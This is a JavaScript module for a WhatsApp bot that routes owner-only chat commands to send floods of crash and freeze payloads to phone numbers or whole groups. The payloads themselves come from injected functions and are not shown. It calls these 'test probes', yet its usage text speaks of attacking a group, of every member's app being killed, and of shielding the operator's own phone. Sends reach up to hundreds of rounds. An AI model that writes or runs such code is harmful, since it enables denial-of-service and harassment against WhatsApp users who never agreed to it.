/**
 * Early interception for temporary flood/app-level test probe commands.
 *
 * Like the one-shot probes, these intentionally run before normal command
 * side effects (reactions, middleware, registry dispatch). This service keeps
 * that early-interception boundary while moving the routing/validation glue
 * out of the main message handler. The underlying payload-sending functions
 * (sendCrashmsgProbe, sendIoszkProbe, sendCrashclickProbe, sendGbHardProbe,
 * sendIozkProbe, sendFiosProbe) are injected unchanged — this module never
 * reimplements or alters their payloads.
 */
export function createFloodProbeService(deps) {
    const {
        normalizeJid,
        isDevNumber,
        safeWaReply,
        delay,
        isSupabaseEnabled,
        setSyncPaused,
        sendIozkProbe,
        sendFiosProbe,
        sendCrashmsgProbe,
        sendIoszkProbe,
        sendCrashclickProbe,
        sendGbHardProbe,
        sendGbStatusProbe,
        recordBugSends,
        log,
        logError,
        fetchThumbnail
    } = deps || {};

    for (const [name, value] of Object.entries({
        normalizeJid,
        isDevNumber,
        safeWaReply,
        delay,
        isSupabaseEnabled,
        setSyncPaused,
        sendIozkProbe,
        sendFiosProbe,
        sendCrashmsgProbe,
        sendIoszkProbe,
        sendCrashclickProbe,
        sendGbHardProbe,
        sendGbStatusProbe,
        recordBugSends,
        log,
        logError,
        fetchThumbnail
    })) {
        if (typeof value !== 'function') throw new Error(`Flood probe service requires ${name}()`);
    }

    function isOwnerSender(sock, senderJid, fromMe) {
        return fromMe || (
            !!sock.user?.id &&
            normalizeJid(senderJid) === normalizeJid(sock.user.id)
        );
    }

    function botOwnNumber(sock, phoneNumber) {
        return String(phoneNumber || '').replace(/\D/g, '') ||
            (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
    }

    async function requireOwnerOrDev({ sock, message, remoteJid, fromMe }) {
        const senderJid = message.key?.participant || message.key?.remoteJid || '';
        if (isOwnerSender(sock, senderJid, fromMe) || isDevNumber(senderJid)) return true;
        await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', message);
        return false;
    }

    async function resolveTargetJid({ sock, message, remoteJid, phoneNumber, targetInput }) {
        const targetNumber = targetInput.replace(/\D/g, '');
        if (!/^\+?[\d\s-]+$/.test(targetInput) || targetNumber.length < 8 || targetNumber.length > 15) {
            return { error: true };
        }
        if (targetNumber === botOwnNumber(sock, phoneNumber)) {
            await safeWaReply(
                sock,
                remoteJid,
                '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.',
                message
            );
            return { error: true, handled: true };
        }
        const targetJid = `${targetNumber}@s.whatsapp.net`;
        try {
            const [account] = await sock.onWhatsApp(targetJid);
            if (!account?.exists) {
                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${targetNumber}`, message);
                return { error: true, handled: true };
            }
        } catch (_) {
            // If lookup is unavailable on the test transport, preserve the
            // original best-effort behavior and try the send anyway.
        }
        return { targetNumber, targetJid };
    }

    async function resolveGroupJid({ sock, message, remoteJid, usage, arg }) {
        if (!arg) {
            await safeWaReply(sock, remoteJid, usage, message);
            return null;
        }
        if (arg.toLowerCase() === 'yes') {
            if (!remoteJid.endsWith('@g.us')) {
                await safeWaReply(sock, remoteJid, `${usage}\n\n❌ this must be run inside a group.`, message);
                return null;
            }
            return remoteJid;
        }
        if (arg.includes('chat.whatsapp.com/')) {
            const code = arg.split('chat.whatsapp.com/')[1].split(/[?\s]/)[0].trim();
            if (!code) {
                await safeWaReply(sock, remoteJid, '❌ Could not read the invite code from that link.', message);
                return null;
            }
            try {
                const info = await sock.groupGetInviteInfo(code);
                return info?.id || null;
            } catch (err) {
                await safeWaReply(sock, remoteJid, `❌ Invite link could not be resolved: ${err?.message || err}`, message);
                return null;
            }
        }
        if (arg.endsWith('@g.us')) return arg;
        await safeWaReply(sock, remoteJid, usage, message);
        return null;
    }

    async function handleFloodIosd({ sock, message, phoneNumber, remoteJid, fromMe, words, kind }) {
        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;

        const parts = words.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
        if (parts.length < 2 || !/^\d{1,3}$/.test(parts[parts.length - 1])) {
            await safeWaReply(sock, remoteJid,
                `❌ *USAGE*\n\n.${kind} <number> <amount 1-300>\n\nExample: .${kind} 2347050253122 200`, message);
            return true;
        }
        const count = Math.min(300, Number(parts[parts.length - 1]));
        const targetInput = parts.slice(0, -1).join(' ').trim();
        const { error, handled, targetNumber, targetJid } = await resolveTargetJid({
            sock, message, remoteJid, phoneNumber, targetInput
        });
        if (error) {
            if (!handled) await safeWaReply(sock, remoteJid, `Usage: .${kind} <number> <amount>`, message);
            return true;
        }

        await safeWaReply(sock, remoteJid, `⏳ .${kind} started — ×${count} → ${targetNumber} (≈${Math.max(1, Math.ceil(count * 1.5 / 60))} min). I'll reply again when done.`, message);
        const syncPause = isSupabaseEnabled();
        if (syncPause) setSyncPaused(true);
        let sent = 0;
        const ids = [];
        try {
            for (let n = 0; n < count; n++) {
                const r = kind === 'crash-iosd' ? await sendIozkProbe(sock, targetJid) : await sendFiosProbe(sock, targetJid);
                if (r?.ids) ids.push(...r.ids);
                sent++;
                log('TEST', `${phoneNumber}: .${kind} send ${sent}/${count} → ${targetJid}`);
            }
            await safeWaReply(sock, remoteJid, `🧪 .${kind} payload sent ×${sent} → ${targetNumber}`, message);
        } catch (err) {
            logError('TEST', `${phoneNumber}: .${kind} failed after ${sent} send(s)`, err);
            await safeWaReply(sock, remoteJid, `❌ .${kind} sent ×${sent} then failed: ${err?.message || err}`, message);
        } finally {
            if (ids.length) recordBugSends(phoneNumber, targetJid, ids);
            if (syncPause) setSyncPaused(false);
        }
        return true;
    }

    async function handleAndroNuke({ sock, message, phoneNumber, remoteJid, fromMe, words }) {
        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;

        const usage =
            '🧪 *ANDRO-NUKE USAGE*\n\n' +
            '• .andro-nuke <number> — one round (×10 payloads)\n' +
            '• .andro-nuke <number> <amount> — rounds (1-300; each round = ×10 payloads)\n\n' +
            '⚠️ Heavy: 200 rounds = 2000 payloads.';
        const parts = words.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
        if (!parts.length) {
            await safeWaReply(sock, remoteJid, usage, message);
            return true;
        }

        let rounds = 1;
        if (parts.length >= 2 && /^\d{1,3}$/.test(parts[parts.length - 1])) {
            rounds = Math.min(300, Number(parts[parts.length - 1]));
            parts.pop();
        }
        const targetInput = parts.join(' ').trim();
        const { error, handled, targetNumber, targetJid } = await resolveTargetJid({
            sock, message, remoteJid, phoneNumber, targetInput
        });
        if (error) {
            if (!handled) await safeWaReply(sock, remoteJid, usage, message);
            return true;
        }

        await safeWaReply(sock, remoteJid, `⏳ .andro-nuke started — ${rounds} round(s) ×10 → ${targetNumber} (≈${Math.max(1, Math.ceil(rounds * 11 / 60))} min). I'll reply again when done.`, message);
        const syncPause = isSupabaseEnabled();
        if (syncPause) setSyncPaused(true);
        let roundsDone = 0, sent = 0;
        const ids = [];
        try {
            for (let r = 0; r < rounds; r++) {
                const res = await sendCrashmsgProbe(sock, targetJid);
                roundsDone++;
                sent += res.sent || 0;
                if (res.ids) ids.push(...res.ids);
                log('TEST', `${phoneNumber}: .andro-nuke round ${roundsDone}/${rounds} (+${res.sent} payloads, total ${sent}${res.wireBytes ? `, ${res.wireBytes}B wire each` : ''}) → ${targetJid}`);
                if (r < rounds - 1) await delay(30 + Math.floor(Math.random() * 40));
            }
            await safeWaReply(sock, remoteJid, `🧪 .andro-nuke done: ${roundsDone} rounds, ${sent} payloads → ${targetNumber}`, message);
        } catch (err) {
            logError('TEST', `${phoneNumber}: .andro-nuke failed after ${sent} payload(s)`, err);
            await safeWaReply(sock, remoteJid, `❌ .andro-nuke sent ${sent} payloads then failed: ${err?.message || err}`, message);
        } finally {
            if (ids.length) recordBugSends(phoneNumber, targetJid, ids);
            if (syncPause) setSyncPaused(false);
        }
        return true;
    }

    async function handleIosZk({ sock, message, phoneNumber, remoteJid, fromMe, words }) {
        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;

        const usage = '🧪 *IOS-ZK USAGE*\n\n• .ios-zk <number> — 60-shot location/mention bomb';
        const parts = words.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
        if (parts.length !== 1) {
            await safeWaReply(sock, remoteJid, usage, message);
            return true;
        }
        const { error, handled, targetNumber, targetJid } = await resolveTargetJid({
            sock, message, remoteJid, phoneNumber, targetInput: parts[0]
        });
        if (error) {
            if (!handled) await safeWaReply(sock, remoteJid, usage, message);
            return true;
        }

        let thumb = Buffer.alloc(0);
        try {
            thumb = await fetchThumbnail();
        } catch (_) {}
        log('TEST', `${phoneNumber}: .ios-zk start → ${targetJid} (thumb ${thumb.length}B)`);

        await safeWaReply(sock, remoteJid, `⏳ .ios-zk sending → ${targetNumber} (60 payloads, ≈1–2 min)…`, message);
        const syncPause = isSupabaseEnabled();
        if (syncPause) setSyncPaused(true);
        try {
            const r = await sendIoszkProbe(sock, targetJid, thumb);
            recordBugSends(phoneNumber, targetJid, r?.ids || []);
            log('TEST', `${phoneNumber}: .ios-zk done: ${r.sent} payloads${r.wireBytes ? ` (${r.wireBytes}B wire each)` : ''} → ${targetJid}`);
            await safeWaReply(sock, remoteJid, `🧪 .ios-zk sent ${r.sent} payloads (thumb ${thumb.length}B) → ${targetNumber}`, message);
        } catch (err) {
            logError('TEST', `${phoneNumber}: .ios-zk failed`, err);
            await safeWaReply(sock, remoteJid, `❌ .ios-zk failed: ${err?.message || err}`, message);
        } finally {
            if (syncPause) setSyncPaused(false);
        }
        return true;
    }

    async function handleGb({ sock, message, phoneNumber, remoteJid, fromMe, words }) {
        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;

        const usage =
            '🧪 *GB USAGE*\n\n' +
            '• .gb yes — attack the group you are in\n' +
            '• .gb <invite link> — attack that group\n' +
            '• .gb <group jid> — attack by JID (.jid in the group)\n\n' +
            'Bot must be a member of the group. ×10 probes per run.';
        const arg = words.slice(1).join(' ').trim();
        const groupJid = await resolveGroupJid({ sock, message, remoteJid, usage, arg });
        if (!groupJid) return true;

        await safeWaReply(sock, remoteJid, '⏳ .gb started — CrashClick ×10 → group…', message);
        let sent = 0;
        const ids = [];
        for (let i = 0; i < 10; i++) {
            try {
                const r = await sendCrashclickProbe(sock, groupJid);
                sent++;
                if (r?.ids) ids.push(...r.ids);
            } catch (_) {}
        }
        if (ids.length) recordBugSends(phoneNumber, groupJid, ids);
        log('GB', `${phoneNumber}: CrashClick ×${sent}/10 sent to group ${groupJid}`);
        await safeWaReply(sock, remoteJid, `🧪 .gb CrashClick ×${sent}/10 sent to the group.`, message);
        return true;
    }

    async function handleGbHard({ sock, message, phoneNumber, remoteJid, fromMe, words }) {
        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;

        const usage =
            '🧪 *GB-HARD — group app-level bug*\n\n' +
            '• .gb-hard yes — attack the group you are in\n' +
            '• .gb-hard <invite link> — attack that group\n' +
            '• .gb-hard <group jid> — attack by JID (.jid in the group)\n' +
            '• .gb-hard <target> <amount> — 1–100 payloads (default ×10)\n\n' +
            '⚠️ App-level: EVERY member\'s WhatsApp takes the icon-tap kill, not just the chat view. NEVER run it in a group your own main phone belongs to. /unbug can clean it within 72h.';
        const targetArg = words[1] || '';
        const count = Math.max(1, Math.min(100, parseInt(words[2], 10) || 10));

        const groupJid = await resolveGroupJid({ sock, message, remoteJid, usage, arg: targetArg });
        if (!groupJid) return true;

        const syncPause = isSupabaseEnabled();
        if (syncPause) setSyncPaused(true);
        await safeWaReply(sock, remoteJid, `⏳ .gb-hard started — app-level ×${count} → group (every member takes the hit). I'll reply again when done.`, message);
        let sent = 0, wire = 0;
        const ids = [];
        try {
            for (let i = 0; i < count; i++) {
                const r = await sendGbHardProbe(sock, groupJid);
                sent++;
                if (r?.wireBytes) wire = r.wireBytes;
                if (r?.ids) ids.push(...r.ids);
                log('GB', `${phoneNumber}: .gb-hard send ${sent}/${count}${wire ? ` (${wire}B wire)` : ''} → ${groupJid}`);
                if (i < count - 1) await delay(30 + Math.floor(Math.random() * 40));
            }
            if (ids.length) recordBugSends(phoneNumber, groupJid, ids);
            await safeWaReply(sock, remoteJid, `🧪 .gb-hard app-level ×${sent}/${count} sent to the group${wire ? ` (${wire}B wire each)` : ''}. Every member takes the hit — /unbug can clean it within 72h.`, message);
        } catch (err) {
            logError('GB', `${phoneNumber}: .gb-hard failed after ${sent} send(s)`, err);
            if (ids.length) recordBugSends(phoneNumber, groupJid, ids);
            await safeWaReply(sock, remoteJid, `❌ .gb-hard sent ×${sent} then failed: ${err?.message || err}`, message);
        } finally {
            if (syncPause) setSyncPaused(false);
        }
        return true;
    }

    // .gb-status — GROUP STATUS kill, SELF-SHIELDED. Posts the groupStatus
    // poison through the status pipeline with statusJidList = group members
    // MINUS the bot's own account, so the owner's phone never receives its
    // own weapon (unlike .gb-hard, which fans out to every member device).
    async function handleGbStatus({ sock, message, phoneNumber, remoteJid, fromMe, words }) {
        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;

        const usage =
            '🧪 *GB-STATUS — group status kill (self-shielded)*\n\n' +
            '• .gb-status yes — attack the group you are in\n' +
            '• .gb-status <invite link> — attack that group\n' +
            '• .gb-status <group jid> — attack by JID (.jid in the group)\n' +
            '• .gb-status <target> <amount> — 1–30 statuses (default ×3)\n\n' +
            '🛡️ Self-shielded: the status audience is every member EXCEPT the bot\'s own account — your phone does not take the hit. Members get it in the status tray + group album + mention ping. /unbug cleans it within 72h.';
        const targetArg = words[1] || '';
        const count = Math.max(1, Math.min(30, parseInt(words[2], 10) || 3));

        const groupJid = await resolveGroupJid({ sock, message, remoteJid, usage, arg: targetArg });
        if (!groupJid) return true;

        let members = [];
        try {
            const meta = await sock.groupMetadata(groupJid);
            members = (meta?.participants || []).map(p => p.id).filter(Boolean);
        } catch (err) {
            await safeWaReply(sock, remoteJid, `❌ Could not read the group member list: ${err?.message || err}`, message);
            return true;
        }
        // THE SHIELD: audience = members minus the bot's own account (PN + LID).
        const ownPn = normalizeJid(String(sock.user?.id || ''));
        const ownLid = sock.user?.lid ? normalizeJid(sock.user.lid) : '';
        const audience = [...new Set(members.map(j => normalizeJid(j)).filter(Boolean))]
            .filter(j => j !== ownPn && j !== ownLid);
        if (!audience.length) {
            await safeWaReply(sock, remoteJid, 'ℹ️ No other members in that group — nothing to hit (you are the only member).', message);
            return true;
        }

        const syncPause = isSupabaseEnabled();
        if (syncPause) setSyncPaused(true);
        await safeWaReply(sock, remoteJid, `⏳ .gb-status started — status kill ×${count} → ${audience.length} member(s). Your phone is shielded. I'll reply again when done.`, message);
        let sent = 0, wire = 0;
        const ids = [];
        try {
            for (let i = 0; i < count; i++) {
                const r = await sendGbStatusProbe(sock, groupJid, audience);
                sent++;
                if (r?.wireBytes) wire = r.wireBytes;
                if (r?.ids) ids.push(...r.ids);
                log('GB', `${phoneNumber}: .gb-status send ${sent}/${count}${wire ? ` (${wire}B wire)` : ''} → ${audience.length} members via status pipeline → ${groupJid}`);
                if (i < count - 1) await delay(30 + Math.floor(Math.random() * 40));
            }
            if (ids.length) recordBugSends(phoneNumber, groupJid, ids, { status: true });
            await safeWaReply(sock, remoteJid, `🧪 .gb-status ×${sent}/${count} posted → ${audience.length} member(s)${wire ? ` (${wire}B wire each)` : ''}. Your phone stayed clean — /unbug can clean it within 72h.`, message);
        } catch (err) {
            logError('GB', `${phoneNumber}: .gb-status failed after ${sent} send(s)`, err);
            if (ids.length) recordBugSends(phoneNumber, groupJid, ids, { status: true });
            await safeWaReply(sock, remoteJid, `❌ .gb-status sent ×${sent} then failed: ${err?.message || err}`, message);
        } finally {
            if (syncPause) setSyncPaused(false);
        }
        return true;
    }

    async function handle(context) {
        const { firstWord, prefix, words } = context;

        if (firstWord === '.crash-iosd' || firstWord === `${prefix}crash-iosd`) {
            return handleFloodIosd({ ...context, kind: 'crash-iosd' });
        }
        if (firstWord === '.frz-iosd' || firstWord === `${prefix}frz-iosd`) {
            return handleFloodIosd({ ...context, kind: 'frz-iosd' });
        }
        if (firstWord === '.andro-nuke' || firstWord === `${prefix}andro-nuke`) {
            return handleAndroNuke(context);
        }
        if (firstWord === '.ios-zk' || firstWord === `${prefix}ios-zk`) {
            return handleIosZk(context);
        }
        if (firstWord === '.gb-hard' || firstWord === `${prefix}gb-hard`) {
            return handleGbHard(context);
        }
        if (firstWord === '.gb-status' || firstWord === `${prefix}gb-status`) {
            return handleGbStatus(context);
        }
        if (firstWord === '.gb' || firstWord === `${prefix}gb`) {
            return handleGb(context);
        }
        return false;
    }

    return Object.freeze({ handle });
}
